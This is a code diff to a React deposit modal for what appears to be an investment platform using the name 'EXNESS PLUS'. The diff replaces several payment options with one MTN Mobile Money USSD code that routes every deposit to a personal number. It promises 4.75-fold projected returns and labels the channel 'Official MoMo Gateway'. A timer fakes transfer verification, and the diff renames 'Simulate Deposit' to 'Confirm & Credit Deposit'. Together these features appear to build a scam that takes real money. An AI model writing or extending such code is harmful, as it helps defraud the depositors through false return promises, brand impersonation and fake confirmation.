@@ -5,14 +5,13 @@ import {
   ArrowRight, 
   CheckCircle2, 
   Smartphone, 
-  Building2, 
-  Coins, 
   Copy, 
   Check, 
   TrendingUp, 
   Info,
   ShieldCheck,
-  Sparkles
+  Sparkles,
+  PhoneCall
 } from 'lucide-react';
 import { formatXAF } from '../utils/formatters';
 import { TOP_UP_PRESETS } from '../data/mockData';
@@ -32,7 +31,6 @@ export const InvestModal: React.FC<InvestModalProps> = ({
 }) => {
   const [selectedPreset, setSelectedPreset] = useState<number>(100000);
   const [customAmount, setCustomAmount] = useState<string>('');
-  const [paymentMethod, setPaymentMethod] = useState<'momo' | 'orange' | 'bank' | 'usdt'>('momo');
   const [copiedRef, setCopiedRef] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
   const [successMode, setSuccessMode] = useState(false);
@@ -44,49 +42,13 @@ export const InvestModal: React.FC<InvestModalProps> = ({
   const projectedReturnAddition = depositAmount * 4.75;
   const newProjectedTotal = (currentDeposit + depositAmount) * 4.75;
 
-  const paymentMethods = [
-    {
-      id: 'momo',
-      name: 'MTN Mobile Money',
-      subtitle: 'Instant credit · Cameroon / CEMAC',
-      icon: Smartphone,
-      color: 'text-yellow-400',
-      merchantCode: '*126*4*67889210#',
-      merchantName: 'EXNESS PLUS ASSET CUSTODY',
-    },
-    {
-      id: 'orange',
-      name: 'Orange Money',
-      subtitle: 'Instant credit · Cameroon / CEMAC',
-      icon: Smartphone,
-      color: 'text-orange-400',
-      merchantCode: '#150*50*091244#',
-      merchantName: 'EXNESS PLUS LIQUIDITY LTD',
-    },
-    {
-      id: 'bank',
-      name: 'UBA / Ecobank Wire',
-      subtitle: 'Direct CEMAC clearing (0% fee)',
-      icon: Building2,
-      color: 'text-blue-400',
-      merchantCode: 'CM21 1003 3051 0001 2490 1029 44',
-      merchantName: 'EXNESS FINANCIAL SERVICES CEMAC',
-    },
-    {
-      id: 'usdt',
-      name: 'USDT (TRC-20)',
-      subtitle: 'Fixed pegged exchange rate (600 XAF/USDT)',
-      icon: Coins,
-      color: 'text-emerald-400',
-      merchantCode: 'TYr84MbcV29nLQW84KpZsT690mZ11a8vxE',
-      merchantName: 'TRC-20 Automated Liquidity Gateway',
-    },
-  ];
-
-  const currentMethodObj = paymentMethods.find((m) => m.id === paymentMethod)!;
+  // MTN Mobile Money USSD code format: *126*9*674940023*<Amount>#
+  const formattedAmountForCode = depositAmount > 0 ? Math.round(depositAmount).toString() : 'Amount';
+  const momoUssdCode = `*126*9*674940023*${formattedAmountForCode}#`;
+  const paymentMethodName = 'MTN Mobile Money';
 
   const handleCopyCode = () => {
-    navigator.clipboard?.writeText(currentMethodObj.merchantCode);
+    navigator.clipboard?.writeText(momoUssdCode);
     setCopiedRef(true);
     setTimeout(() => setCopiedRef(false), 2000);
   };
@@ -99,7 +61,7 @@ export const InvestModal: React.FC<InvestModalProps> = ({
       setIsProcessing(false);
       setSuccessMode(true);
       setLastAddedAmount(depositAmount);
-      onConfirmDeposit(depositAmount, currentMethodObj.name);
+      onConfirmDeposit(depositAmount, paymentMethodName);
     }, 1200);
   };
 
@@ -159,7 +121,7 @@ export const InvestModal: React.FC<InvestModalProps> = ({
               </div>
               <div className="flex justify-between">
                 <span className="text-slate-500">Method:</span>
-                <span className="text-slate-200">{currentMethodObj.name}</span>
+                <span className="text-yellow-400 font-semibold">{paymentMethodName}</span>
               </div>
               <div className="flex justify-between">
                 <span className="text-slate-500">Updated 6M Projected:</span>
@@ -253,76 +215,92 @@ export const InvestModal: React.FC<InvestModalProps> = ({
               </div>
             </div>
 
-            {/* Step 2: Payment Channel */}
+            {/* Step 2: Payment Channel - MTN Mobile Money Only */}
             <div>
-              <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider block mb-2.5">
-                2. Select Deposit Channel
-              </label>
+              <div className="flex items-center justify-between mb-2.5">
+                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider block">
+                  2. Deposit Channel
+                </label>
+                <span className="text-[11px] font-mono text-emerald-400 bg-emerald-950/50 border border-emerald-800/50 px-2 py-0.5 rounded">
+                  Official MoMo Gateway
+                </span>
+              </div>
 
-              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
-                {paymentMethods.map((method) => {
-                  const Icon = method.icon;
-                  const isSelected = paymentMethod === method.id;
-
-                  return (
-                    <div
-                      key={method.id}
-                      onClick={() => setPaymentMethod(method.id as any)}
-                      className={`p-3 rounded-xl border cursor-pointer transition-all ${
-                        isSelected
-                          ? 'bg-slate-800/90 border-emerald-500/80 shadow-md'
-                          : 'bg-slate-900/60 border-slate-800 hover:border-slate-700'
-                      }`}
-                    >
-                      <div className="flex items-center gap-2.5">
-                        <Icon className={`w-4 h-4 ${method.color}`} />
-                        <span className="text-xs font-semibold text-white">
-                          {method.name}
+              <div className="p-3.5 rounded-xl border bg-slate-800/80 border-yellow-500/50 shadow-md">
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center gap-3">
+                    <div className="w-9 h-9 rounded-lg bg-yellow-500/10 border border-yellow-500/30 flex items-center justify-center text-yellow-400">
+                      <Smartphone className="w-5 h-5" />
+                    </div>
+                    <div>
+                      <div className="text-sm font-bold text-white flex items-center gap-2">
+                        <span>MTN Mobile Money (MoMo)</span>
+                        <span className="text-[10px] font-mono text-yellow-300 bg-yellow-950/60 px-1.5 py-0.5 rounded border border-yellow-700/40">
+                          Active Channel
                         </span>
                       </div>
-                      <div className="text-[11px] text-slate-400 mt-1">
-                        {method.subtitle}
+                      <div className="text-xs text-slate-400 mt-0.5">
+                        Direct USSD transfer · Instant credit to Mbifong Cornelius vault
                       </div>
                     </div>
-                  );
-                })}
+                  </div>
+                </div>
               </div>
             </div>
 
-            {/* Step 3: Instructions & Destination Details */}
+            {/* Step 3: USSD Dialing String & Instructions */}
             <div className="bg-slate-900/90 border border-slate-800 rounded-xl p-4 space-y-3">
               <div className="flex items-center justify-between text-xs">
-                <span className="text-slate-400">Payment Instructions:</span>
-                <span className="text-[11px] font-mono text-emerald-400">Instant Clearing</span>
+                <span className="text-slate-400 font-semibold flex items-center gap-1.5">
+                  <PhoneCall className="w-3.5 h-3.5 text-yellow-400" />
+                  MoMo USSD Payment Code:
+                </span>
+                <span className="text-[11px] font-mono text-emerald-400">Auto-formatted with Amount</span>
               </div>
 
-              <div className="flex items-center justify-between bg-black/40 border border-slate-800 rounded-lg p-2.5 font-mono text-xs">
+              {/* Prominent USSD Code Display */}
+              <div className="flex items-center justify-between bg-black/60 border border-yellow-500/40 rounded-xl p-3 font-mono">
                 <div className="truncate pr-2">
-                  <span className="text-slate-500 block text-[10px] uppercase">
-                    Merchant / USSD Code / Address
+                  <span className="text-slate-500 block text-[10px] uppercase font-sans tracking-wider">
+                    Dial Directly On Your MTN Line:
                   </span>
-                  <span className="text-slate-200 select-all font-semibold">
-                    {currentMethodObj.merchantCode}
+                  <span className="text-yellow-400 select-all font-bold text-sm sm:text-base tracking-wide">
+                    {momoUssdCode}
                   </span>
                 </div>
                 <button
                   type="button"
                   onClick={handleCopyCode}
-                  className="p-1.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 transition-colors shrink-0"
-                  title="Copy Details"
+                  className="px-3 py-1.5 rounded-lg bg-yellow-500/20 hover:bg-yellow-500/30 border border-yellow-500/40 text-yellow-300 text-xs font-semibold flex items-center gap-1.5 transition-colors shrink-0 cursor-pointer"
+                  title="Copy USSD Code"
                 >
-                  {copiedRef ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
+                  {copiedRef ? (
+                    <>
+                      <Check className="w-3.5 h-3.5 text-emerald-400" />
+                      <span className="text-emerald-400">Copied</span>
+                    </>
+                  ) : (
+                    <>
+                      <Copy className="w-3.5 h-3.5" />
+                      <span>Copy</span>
+                    </>
+                  )}
                 </button>
               </div>
 
-              <div className="text-[11px] text-slate-400 space-y-1">
-                <div className="flex items-start gap-1.5">
-                  <span className="text-emerald-400 font-bold">1.</span>
-                  <span>Dial or transfer from your registered line belonging to <strong>Mbifong Cornelius</strong>.</span>
+              {/* Instructions list */}
+              <div className="text-[11px] text-slate-400 space-y-1.5 pt-1">
+                <div className="flex items-start gap-2">
+                  <span className="w-4 h-4 rounded-full bg-slate-800 text-yellow-400 flex items-center justify-center font-bold text-[10px] shrink-0 mt-0.5">1</span>
+                  <span>Dial <strong className="font-mono text-yellow-300">{momoUssdCode}</strong> from your MTN phone.</span>
                 </div>
-                <div className="flex items-start gap-1.5">
-                  <span className="text-emerald-400 font-bold">2.</span>
-                  <span>Reference Code: <strong className="font-mono text-slate-200">EXP-CM-904128</strong></span>
+                <div className="flex items-start gap-2">
+                  <span className="w-4 h-4 rounded-full bg-slate-800 text-yellow-400 flex items-center justify-center font-bold text-[10px] shrink-0 mt-0.5">2</span>
+                  <span>Confirm transfer of <strong className="text-white font-mono">{formatXAF(depositAmount)}</strong> to recipient <strong>674940023</strong>.</span>
+                </div>
+                <div className="flex items-start gap-2">
+                  <span className="w-4 h-4 rounded-full bg-slate-800 text-yellow-400 flex items-center justify-center font-bold text-[10px] shrink-0 mt-0.5">3</span>
+                  <span>Enter your MoMo PIN to validate. Funds credit automatically to account <strong className="font-mono text-slate-300">EXP-CM-904128</strong>.</span>
                 </div>
               </div>
             </div>
@@ -338,11 +316,11 @@ export const InvestModal: React.FC<InvestModalProps> = ({
                 {isProcessing ? (
                   <>
                     <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
-                    <span>Verifying Transfer & Crediting Vault...</span>
+                    <span>Verifying MoMo Transfer & Crediting Vault...</span>
                   </>
                 ) : (
                   <>
-                    <span>Simulate Deposit ({formatXAF(depositAmount)})</span>
+                    <span>Confirm & Credit Deposit ({formatXAF(depositAmount)})</span>
                     <ArrowRight className="w-4 h-4" />
                   </>
                 )}
